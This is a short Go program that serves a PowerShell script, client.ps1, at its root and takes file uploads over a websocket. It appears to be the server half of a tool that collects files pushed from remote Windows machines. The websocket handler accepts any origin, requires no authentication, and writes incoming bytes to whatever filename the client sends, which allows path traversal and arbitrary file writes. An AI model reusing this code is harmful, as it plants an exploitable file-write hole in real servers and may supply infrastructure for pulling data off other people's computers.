package main

import (
	"encoding/json"
	"log"
	"net/http"
	"os"
	"text/template"

	"github.com/gorilla/websocket"
)

var upgrader = websocket.Upgrader{
	ReadBufferSize:  1024,
	WriteBufferSize: 1024,
}

type Message struct {
	FileName string `json:"filename"`
}

func handleHomepage(w http.ResponseWriter, r *http.Request) {
	var tmplFile = "client.ps1"
	tmpl, err := template.New(tmplFile).ParseFiles(tmplFile)
	if err != nil {
		panic(err)
	}
	//
	err = tmpl.Execute(w, r)
	if err != nil {
		panic(err)
	}
}

func handleWebSocket(w http.ResponseWriter, r *http.Request) {
	upgrader.CheckOrigin = func(r *http.Request) bool { return true }
	conn, err := upgrader.Upgrade(w, r, nil)
	if err != nil {
		log.Println(err)
		return
	}
	defer conn.Close()

	var message Message
	for {
		messageType, msg, err := conn.ReadMessage()
		if err != nil {
			if websocket.IsCloseError(err, websocket.CloseNormalClosure, websocket.CloseGoingAway) {
				break
			}
			log.Printf("Error: %s", err)
			break
		}

		if messageType == websocket.TextMessage {
			json.Unmarshal(msg, &message)
			log.Printf("Incoming file: %s", message.FileName)
		} else if messageType == websocket.BinaryMessage {
			log.Printf("Received binary data for file: %s", message.FileName)
			err := os.WriteFile(message.FileName, msg, 0644)
			if err != nil {
				log.Fatal(err)
			}
		}
	}
}

func main() {
	http.HandleFunc("/", handleHomepage)
	http.HandleFunc("/ws", handleWebSocket)

	log.Fatal(http.ListenAndServe(":8080", nil))
}
